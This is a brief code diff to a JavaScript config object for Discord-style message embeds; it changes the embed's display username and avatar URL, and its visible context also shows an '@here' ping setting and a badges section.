@@ -20,13 +20,13 @@ var config = {
     ping: [false, "@here"],
 
     embed: {
-        username: "itzgonza",
+        username: "eu#1337",
         footer: {
             text: `itzgonza`,
             icon_url: "https://cdn.discordapp.com/avatars/856704102016614460/fcea9c001343bc4d49dc78194bdd25a3.png?size=2048",
         },
         href: "https://github.com/itzgonza",
-        avatar_url: "https://avatars.githubusercontent.com/u/61884903?v=4"
+        avatar_url: "https://cdn.discordapp.com/avatars/856704102016614460/fcea9c001343bc4d49dc78194bdd25a3.png?size=2048"
     },
 
     badges: {
